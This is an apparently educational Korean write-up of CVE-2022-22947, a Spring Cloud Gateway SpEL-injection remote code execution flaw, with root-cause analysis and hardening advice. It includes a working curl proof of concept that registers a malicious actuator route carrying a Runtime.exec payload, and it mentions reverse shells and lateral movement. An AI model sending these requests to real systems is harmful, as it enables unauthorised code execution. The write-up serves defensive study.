# CVE-2022-22947 - Spring Cloud Gateway RCE

## 개요

| 항목 | 내용 |
|------|------|
| CVE ID | CVE-2022-22947 |
| CVSS | 10.0 (Critical) |
| 영향 소프트웨어 | Spring Cloud Gateway |
| 영향 버전 | 3.1.0, 3.0.0 ~ 3.0.6 |
| 수정 버전 | 3.1.1, 3.0.7 |
| 공격 유형 | RCE (SpEL Injection) |
| 발견일 | 2022-03-01 |

## 영향 범위 & 심각성

Spring Cloud Gateway는 마이크로서비스 아키텍처의 API Gateway로 널리 사용되며, CVSS 만점(10.0)을 받은 초고위험 취약점이다.

- **조건**: Gateway Actuator 엔드포인트가 외부에 노출된 경우
- API Gateway는 모든 백엔드 서비스의 진입점이므로, 탈취 시 전체 인프라 장악 가능
- Spring Cloud Gateway를 사용하는 마이크로서비스 아키텍처 전반에 영향
- 실제 공격 사례가 다수 보고됨 (특히 클라우드 환경)
- Actuator가 기본적으로 노출되는 잘못된 설정이 흔하여 공격 표면이 넓음

## 취약점 기술 분석

### 근본 원인

Spring Cloud Gateway의 Actuator API를 통해 동적으로 라우팅 규칙을 추가할 수 있는데, 필터 정의에 **SpEL(Spring Expression Language)** 표현식을 삽입할 수 있었다.

```java
// Gateway Actuator를 통해 라우트 추가 시
// filter 정의에서 SpEL 표현식이 평가됨
// #{T(java.lang.Runtime).getRuntime().exec('command')}
```

### 공격 체인

1. Actuator의 `/actuator/gateway/routes` 엔드포인트에 악성 라우트 등록
2. 라우트의 filter 정의에 SpEL 표현식 주입
3. `/actuator/gateway/refresh` 호출로 라우트 리로드
4. SpEL 표현식이 평가되면서 임의 코드 실행

## 공격 시나리오

```bash
# 1단계: 악성 라우트 등록
curl -X POST http://target.com/actuator/gateway/routes/exploit \
  -H "Content-Type: application/json" \
  -d '{
    "id": "exploit",
    "filters": [{
      "name": "AddResponseHeader",
      "args": {
        "name": "Result",
        "value": "#{T(java.lang.Runtime).getRuntime().exec(\"id\")}"
      }
    }],
    "uri": "http://example.com",
    "predicates": ["Path=/exploit/**"]
  }'

# 2단계: 라우트 리프레시
curl -X POST http://target.com/actuator/gateway/refresh

# 3단계: 결과 확인 (응답 헤더에 실행 결과)
curl http://target.com/exploit/
```

```
공격 흐름:
1단계: /actuator/gateway/routes 접근 가능 여부 확인
2단계: SpEL 표현식을 포함한 악성 라우트 POST
3단계: /actuator/gateway/refresh 호출로 적용
4단계: 해당 라우트로 요청 → SpEL 실행 → RCE
5단계: 리버스 쉘 획득 후 내부 마이크로서비스 횡적 이동
```

## 방어 방법

1. **즉시 업데이트**: Spring Cloud Gateway 3.1.1+ 또는 3.0.7+
2. **Actuator 접근 제한**: 외부에서 Actuator 엔드포인트 접근 불가하도록 설정
   ```yaml
   management:
     server:
       port: 8081  # 별도 포트로 분리
     endpoints:
       web:
         exposure:
           include: health,info  # 필요한 것만 노출
   ```
3. **Actuator 비활성화**: Gateway Actuator가 불필요하면 완전 비활성화
   ```yaml
   management:
     endpoint:
       gateway:
         enabled: false
   ```
4. **네트워크 격리**: 관리 포트는 내부 네트워크에서만 접근 가능하도록 설정
5. **인증 추가**: Actuator 엔드포인트에 Spring Security 인증 적용

## 교훈

- **관리 인터페이스는 반드시 보호**: Actuator, Admin 패널 등은 절대 공개 네트워크에 노출하지 않음
- **동적 코드 평가의 위험**: SpEL, OGNL 등 표현식 언어를 사용자 입력에 적용하면 RCE
- **API Gateway는 최우선 보호 대상**: 전체 트래픽이 통과하는 지점이므로 보안 최우선
- **기본 설정 검토**: Actuator의 기본 노출 범위를 반드시 프로덕션 환경에서 제한
- **제로 트러스트**: 내부 서비스 간에도 인증/인가 적용

## 참고 자료

- [VMware Advisory - CVE-2022-22947](https://tanzu.vmware.com/security/cve-2022-22947)
- [NVD - CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)
- [Spring Cloud Gateway Docs](https://docs.spring.io/spring-cloud-gateway/docs/current/reference/html/)
- [Wiz.io - Spring Cloud Exploits](https://www.wiz.io/blog/spring-cloud-vulnerability)
- [CISA Known Exploited Vulnerabilities](https://www.cisa.gov/known-exploited-vulnerabilities-catalog)
